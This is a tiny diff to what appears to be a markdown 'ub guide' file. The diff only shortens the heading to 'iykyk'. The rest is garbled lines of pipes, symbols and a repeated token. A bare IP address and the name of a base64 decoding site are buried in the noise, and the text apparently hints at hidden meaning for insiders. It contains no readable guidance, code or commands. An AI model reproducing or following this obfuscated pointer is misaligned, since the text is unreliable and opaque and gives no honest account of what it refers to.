@@ -1,4 +1,4 @@
-# ub guide - if you know you know
+# ub guide - iykyk
 
 |||P9dfs*&(b|||P9dfs*&(b|||P9dfs*&(b|||P9dfs*&(b|||P9dfs*&(b
 |*(&)||$%^&*(||||)|||||P9dfs*&(bd|||P9dfs*&(b||||||P9dfs*&(b|||P9dfs*&(b|||P9dfs*&(b|||P9dfs*&(bP9dfs*&|||P9dfs*&(bdsf|base64decode.org|(|216.105.168.10||*(&)||$%^&*(|||P9dfs*&(b
